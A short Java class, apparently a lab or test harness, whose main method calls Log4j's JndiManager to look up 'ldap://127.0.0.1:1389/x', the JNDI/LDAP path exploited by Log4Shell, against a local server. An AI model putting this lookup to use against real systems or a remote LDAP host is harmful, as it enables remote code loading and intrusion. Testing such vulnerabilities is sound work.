package seta.log4j.p3;

public final class App {
    private App() {
    }

    public static void main(String[] args) throws Exception {
        org.apache.logging.log4j.core.net.JndiManager.getDefaultManager().lookup("ldap://127.0.0.1:1389/x");
    }
}
